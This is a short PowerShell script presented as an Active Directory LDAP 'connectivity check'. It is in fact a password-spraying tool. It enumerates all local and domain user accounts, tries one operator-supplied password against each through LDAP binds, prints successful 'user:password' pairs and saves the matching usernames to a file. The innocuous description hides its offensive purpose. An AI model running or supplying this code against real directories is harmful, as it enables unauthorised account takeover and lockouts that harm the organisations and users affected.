# Author: Yuval Saban
# This Script helps to perform a connectivity check against the Active Directory LDAP service.

Function Test-ADConnection {
    param(
        $username,
        $password)   
    return (New-Object DirectoryServices.DirectoryEntry "",$username,$password).psbase.name -ne $null
}
$password = Read-Host 'Enter A Password'
$Counter = 0 
$total = (Get-WmiObject -Class Win32_UserAccount | Measure-Object).Count
$DomainName = (Get-WmiObject -Class Win32_UserAccount | Select-Object -Index 10).Domain

Get-WmiObject -Class Win32_UserAccount | ForEach-Object{
    $UserName = $_.Caption
    $auth = Test-ADConnection -username $UserName -password $password
    if($auth -eq "True"){
        Write-Host -ForegroundColor Green ("[+] {0}:{1}" -f $UserName,$password)
        $UserName -replace "$DomainName\\"| Out-File UsersFound.txt -Append
    }
    Write-Progress -Activity "In Progress" -Status  "$Counter/$total Completed" -PercentComplete($Counter/$total*100)
    $Counter++    
}
